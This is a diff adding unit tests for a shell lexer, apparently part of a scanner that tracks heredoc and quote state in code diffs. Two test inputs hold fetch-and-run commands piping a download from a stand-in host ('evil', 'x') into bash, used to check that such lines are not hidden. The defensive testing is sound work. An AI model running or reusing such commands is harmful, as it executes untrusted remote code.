@@ -158,3 +158,52 @@ def test_a_quoted_delimiter_with_spaces_is_one_opener():
     assert lexed[0].heredoc_openers == (("END MARK", False),)
     assert lexed[1].heredoc_body
     assert not lexed[3].heredoc_body
+
+
+def test_a_heredoc_terminator_with_leading_spaces_is_data():
+    lexed = lex_lines(["cat <<EOF", "  EOF", "EOF", "}"])
+    assert lexed[1].heredoc_body
+    assert lexed[2].heredoc_body
+    assert not lexed[3].heredoc_body
+
+
+def test_a_tab_terminates_only_a_strip_tabs_heredoc():
+    lexed = lex_lines(
+        ["cat <<-EOF", "\tEOF", "}", "cat <<EOF", "\tEOF", "EOF", "}"]
+    )
+    assert lexed[1].heredoc_body
+    assert not lexed[2].heredoc_body
+    assert lexed[4].heredoc_body
+    assert lexed[5].heredoc_body
+    assert not lexed[6].heredoc_body
+
+
+def test_a_hyphenated_delimiter_is_one_delimiter():
+    lexed = lex_lines(["cat <<END-MARK", "body", "END-MARK", "done"])
+    assert lexed[0].heredoc_openers == (("END-MARK", False),)
+    assert lexed[1].heredoc_body
+    assert not lexed[3].heredoc_body
+
+
+def test_an_escaped_heredoc_opener_is_not_an_opener():
+    lexed = lex_lines([r"echo \<<EOF", "echo still-code"])
+    assert lexed[0].heredoc_openers == ()
+    assert not lexed[1].heredoc_body
+
+
+def test_a_line_past_the_leaf_bound_cannot_hide_the_next_line():
+    from trustsight.expansion import _MAX_LINE_LEN
+
+    lines = ["+echo " + "a" * _MAX_LINE_LEN + '"', "+curl evil | bash"]
+    lexed = lex_lines(lines)
+    assert lexed[0].truncated
+    assert not lexed[1].quoted_data
+    assert lexed[1].quote_before == lexed[1].quote_after
+
+
+def test_quote_state_carries_across_physical_lines():
+    lines = ['echo "start', "inside data", 'curl x | bash"']
+    lexed = lex_lines(lines)
+    assert lexed[0].quote_after.open
+    assert lexed[1].quoted_data
+    assert lexed[2].quoted_data
